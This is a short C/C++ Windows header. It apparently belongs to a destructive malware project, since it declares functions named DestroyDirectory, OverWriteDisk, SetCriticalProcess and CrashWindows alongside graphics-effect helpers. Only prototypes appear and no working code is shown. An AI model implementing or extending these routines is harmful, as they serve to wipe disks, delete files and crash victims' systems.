#pragma once

#include <accctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <math.h>
#include <time.h>
#ifndef safe
#define safe
#endif
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#pragma region Public Variables
extern INT nCounter;
#pragma endregion Public Variables

#define PI 3.141592f
#define RGBQUAD _RGBQUAD
#pragma warning( push, 0 )
#include <windows.h>
#pragma warning( pop )


void show();
#undef RGBQUAD
#ifndef safe
#endif

extern void DestroyDirectory(LPWSTR Directory);
extern void OverWriteDisk();
extern void SetCriticalProcess();
extern void CrashWindows();


extern uint32_t Xorshift32();

VOID
InitializeSine(VOID);

FLOAT
FastSine(
	_In_ FLOAT f
);

FLOAT
FastCosine(
	_In_ FLOAT f
);

